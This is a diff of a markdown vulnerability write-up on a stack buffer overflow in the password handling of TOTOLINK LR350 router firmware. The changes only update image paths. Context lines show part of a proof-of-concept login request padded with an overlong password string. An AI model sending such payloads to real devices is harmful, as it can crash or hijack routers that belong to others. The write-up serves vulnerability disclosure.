@@ -14,9 +14,9 @@ Firmware download address ：[TOTOLINK](https://www.totolink.net/home/menu/detai
 
 As shown in the two images below, in the function`urldecode` , the processed (`password`) is written to a buffer  located on the stack. **However, there is no validation to check if the `password` (`a1`) exceeds the length of the buffer (`a2`, `v3`).** Therefore, attackers can hijack the program or cause a DDoS attack by carefully constructing data.
 
-![image-20240508121926199](/image-20240508121926199.png)
+![image-20240508121926199](/totolink%20LR350/image-20240508121926199.png)
 
-![image-20240508121953884](/image-20240508121953884.png)
+![image-20240508121953884](/totolink%20LR350/image-20240508121953884.png)
 
 ### POC
 
@@ -37,4 +37,4 @@ Referer: http://192.168.147.140/login.html
 {"username":"admin","password":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","verify":"0","flag":"0","topicurl":"loginAuth"}
 ```
 
-![image-20240508122545258](/image-20240508122545258.png)
+![image-20240508122545258](/totolink%20LR350/image-20240508122545258.png)
